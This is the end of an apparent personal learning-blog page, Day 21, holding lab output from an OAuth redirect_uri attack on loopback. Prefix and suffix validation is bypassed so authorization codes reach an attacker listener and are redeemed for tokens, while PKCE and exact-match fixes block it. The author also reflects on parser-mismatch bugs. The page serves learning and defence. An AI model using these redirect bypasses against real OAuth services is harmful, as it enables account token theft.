+code (first 16 chars)   : n8-3YesDrF5CdeTJ...
+attacker redemption     : 200 {&quot;access_token&quot;: &quot;AkR3bwrLaLEF4YJ5aE5ZRA&quot;, &quot;token_type&quot;: &quot;Bearer&quot;, &quot;scope&quot;: &quot;read&quot;}
+result                  : TOKEN STOLEN with no user interaction
+
+--- VULN 2: validator checks redirect_uri.endswith(&#x27;/cb&#x27;) ---
+registered redirect_uri : http://127.0.0.1:43973/cb
+attacker redirect_uri   : http://127.0.0.1:36029/anything/cb
+AS /authorize           : 302 followed -&gt; HTTP 200 from the listener
+code delivered to       : 127.0.0.1:36029 (attacker)
+code (first 16 chars)   : pqied0tMGdrJxC2H...
+attacker redemption     : 200 {&quot;access_token&quot;: &quot;O0nbs9wJlxsbPmBp0dQavw&quot;, &quot;token_type&quot;: &quot;Bearer&quot;, &quot;scope&quot;: &quot;read&quot;}
+result                  : TOKEN STOLEN with no user interaction
+
+--- VULN 1 again, but the client is forced onto PKCE (S256) ---
+registered redirect_uri : http://127.0.0.1:35181/cb
+attacker redirect_uri   : http://127.0.0.1:43777/r?next=http://127.0.0.1:35181/cb
+AS /authorize           : 302 followed -&gt; HTTP 200 from the listener
+code delivered to       : 127.0.0.1:43777 (attacker)
+code (first 16 chars)   : ApnHFIJlWlvTihGa...
+attacker redemption     : 400 {&quot;error&quot;: &quot;invalid_grant&quot;, &quot;detail&quot;: &quot;PKCE verifier missing or wrong&quot;}
+result                  : code leaked but unusable
+
+--- FIXED: exact string match against the registered URI ---
+registered redirect_uri : http://127.0.0.1:43835/cb
+attacker redirect_uri   : http://127.0.0.1:36435/r?next=http://127.0.0.1:43835/cb
+AS /authorize           : HTTP 400 {&quot;error&quot;: &quot;invalid_request&quot;, &quot;error_description&quot;: &quot;redirect_uri not registered&quot;}
+result                  : no code minted, nothing to steal</code></pre>
+<p><strong>What I understood:</strong> the leaked artifact is not a password, and that is</p>
+<p>exactly why it is dangerous — it is a one-time, short-lived, correctly-issued</p>
+<p>credential that no alert will look at twice. The bug is not in the crypto, the</p>
+<p>state parameter, or the token format. It is in a comparison operator that</p>
+<p>answered a slightly different question than the one the browser answered.</p>
+<p>This is the third time in four days that the same root shows up wearing a new</p>
+<p>coat. Day 18 was two HTTP parsers disagreeing about where a body ends; day 19</p>
+<p>was the hostname that gets <em>checked</em> not being the hostname that gets <em>fetched</em>;</p>
+<p>day 20 was a header being treated as the app&#x27;s own address. Today it is a URL</p>
+<p>compared as text by one component and as a tree by another. Whenever two</p>
+<p>components parse the same input, the attacker lives in the gap, and the fix is</p>
+<p>almost never a better filter — it is deleting the second interpretation.</p>
+<p>Honest limits: everything is on loopback and the &quot;victim already logged in&quot; part</p>
+<p>is a stub, not a session — I proved the validation logic and the redemption</p>
+<p>chain, not the behaviour of any real provider. I also followed the 302 with</p>
+<p><code>urllib</code>, which behaves like a top-level navigation, but I did not drive a real</p>
+<p>browser, so browser-side quirks (fragment handling, <code>Referer</code> on the redirect,</p>
+<p>mixed-content blocking on <code>http://</code> loopback) are untested here. Real deployments</p>
+<p>also carry the RFC 8252 loopback case for native apps, where the port is</p>
+<p>ephemeral by design and exact match has to be per-client rather than global —</p>
+<p>which is precisely the kind of exception that gets widened into the bug above.</p>
+<p>---</p>
+<h2>Day 21 notes</h2>
+<ul><li>Concept #21: MA02 closed with the recap compressed to one claim — the 95% CI is exactly the set of μ₀ the t-test would not reject. 26-point scan, 0 disagreements; pooled t² = F to 0.00e+00; book&#x27;s printed SSA (305.56) does not reproduce from its own printed means (305.74), second rounding drift found in two days. ✔</li><li>Security #21: OAuth <code>redirect_uri</code> validated by substring or suffix match → authorization code delivered to the attacker&#x27;s listener and redeemed for a token; exact-match registration blocks it, PKCE makes the stolen code unusable (<code>invalid_grant</code>). Loopback sandbox only. ✔</li><li>1579 days left. One at a time.</li></ul>
+<p><em>Written by my own daily machine, checked by me.</em></p>
+  </div>
+</article>
+<footer>
+  <div class="wrap">
+    <p><a href="/">← Back to the index</a> · Day 021 of 1600 · Matías Rathgeb</p>
+  </div>
+</footer>
+</body>
+</html>
